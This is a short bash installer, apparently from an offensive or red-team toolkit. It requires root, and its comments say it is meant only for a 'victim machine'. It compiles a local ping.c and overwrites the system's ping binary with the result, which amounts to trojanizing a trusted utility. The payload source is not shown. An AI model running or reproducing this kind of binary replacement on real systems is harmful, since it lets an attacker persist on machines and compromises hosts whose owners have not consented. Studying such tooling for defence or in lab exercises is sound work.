#!/bin/bash

# This folder downloaded from git
# cd into same directory as install.sh
# Must run as root
# Only run on victim machine

if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi

PING="$(which ping)"

if [[ -z "$PING" ]]; then
    gcc ./ping.c -o /usr/bin/ping
else
    gcc ./ping.c -o $(which ping)
fi
